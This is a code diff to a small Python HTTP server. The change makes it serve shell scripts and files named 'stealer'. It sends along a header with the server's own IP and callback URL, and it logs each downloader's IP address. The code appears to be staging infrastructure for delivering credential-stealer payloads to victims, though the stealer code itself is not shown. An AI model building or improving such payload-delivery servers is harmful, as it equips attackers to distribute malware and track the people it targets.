@@ -7,6 +7,7 @@ import socketserver
 import json
 from pathlib import Path
 import os
+import socket
 
 
 class ServerHandler(http.server.SimpleHTTPRequestHandler):
@@ -44,14 +45,23 @@ class ServerHandler(http.server.SimpleHTTPRequestHandler):
         if self.path == '/':
             self.send_response(404)
             self.end_headers()
-        elif self.path.endswith('.py'):
+        elif self.path.endswith('.py') or self.path.endswith('.sh') or self.path.endswith('stealer'):
             script_name = self.path.lstrip('/')
             script_path = Path(script_name)
             
             if script_path.exists() and script_name != 'server.py':
+                config = self._get_server_config()
+                
+                self.send_response(200)
+                self.send_header('Content-type', 'application/octet-stream')
+                self.send_header('X-Server-Config', json.dumps(config))
+                self.end_headers()
+                
+                with open(script_path, 'rb') as f:
+                    self.wfile.write(f.read())
+                
                 print(f"Served: {script_name}")
                 print(f"From IP: {self.client_address[0]}")
-                super().do_GET()
             else:
                 self.send_response(404)
                 self.end_headers()
@@ -59,9 +69,41 @@ class ServerHandler(http.server.SimpleHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
     
-    def log_message(self, format, *args):
-        pass  # Suppress default logging
+    def _get_server_config(self):
+        """Get server configuration"""
+        server_ip = "localhost"
+        
+        try:
+            import socket
+            hostname = socket.gethostname()
+            all_ips = socket.gethostbyname_ex(hostname)[2]
+            
+            for ip in all_ips:
+                if not ip.startswith("127."):
+                    if ip.startswith(("10.")):
+                        server_ip = ip
+                        break
+                    server_ip = ip 
+            if server_ip == "localhost":
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                try:
+                    s.connect(("8.8.8.8", 80))
+                    server_ip = s.getsockname()[0]
+                finally:
+                    s.close()
+        except Exception as e:
+            print(f"Error getting IP: {e}")
+            server_ip = "localhost"
 
+        print(f"Server config IP: {server_ip}")  # Debug line
+        
+        return {
+            "server": {
+                "ip": server_ip,
+                "port": self.server.server_address[1],
+                "url": f"http://{server_ip}:{self.server.server_address[1]}"
+            }
+        }
 
 def start_server(port=8000, directory="./scripts"):
     """Start the server"""
